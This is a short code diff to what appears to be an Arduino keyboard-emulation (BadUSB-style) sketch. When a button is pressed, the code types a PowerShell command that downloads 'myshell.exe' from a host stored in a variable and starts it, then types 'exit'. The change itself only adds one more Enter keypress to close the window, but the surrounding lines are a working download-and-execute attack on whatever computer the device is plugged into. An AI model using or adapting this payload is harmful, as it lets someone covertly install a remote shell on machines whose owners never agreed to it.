@@ -46,6 +46,7 @@ void loop()
     Keyboard.print("(new-object System.Net.WebClient).DownloadFile('http://" + direccion + "/myshell.exe', 'myshell.exe'); Start-Process \"myshell.exe\" ");
     typeKey(KEY_RETURN);  
     Keyboard.print("exit");
+    typeKey(KEY_RETURN);
   }
   previousButtonState = buttonState;
 }
